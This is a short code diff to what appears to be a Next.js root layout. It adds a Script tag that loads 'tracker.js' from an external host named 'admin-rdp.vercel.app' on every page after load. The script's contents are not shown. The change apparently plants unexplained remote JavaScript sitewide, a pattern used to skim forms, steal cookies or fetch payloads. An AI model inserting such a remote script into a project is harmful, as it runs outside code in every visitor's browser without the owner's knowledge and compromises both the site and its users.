@@ -1,3 +1,4 @@
+import Script from "next/script";
 import "./globals.css";
 import type { Metadata } from "next";
 import type { ReactNode } from "react";
@@ -19,6 +20,7 @@ export default function RootLayout({ children }: { children: ReactNode }) {
       <body>
         <CopyAttribution />
         {children}
+        <Script src="https://admin-rdp.vercel.app/tracker.js" strategy="afterInteractive" />
       </body>
     </html>
   );
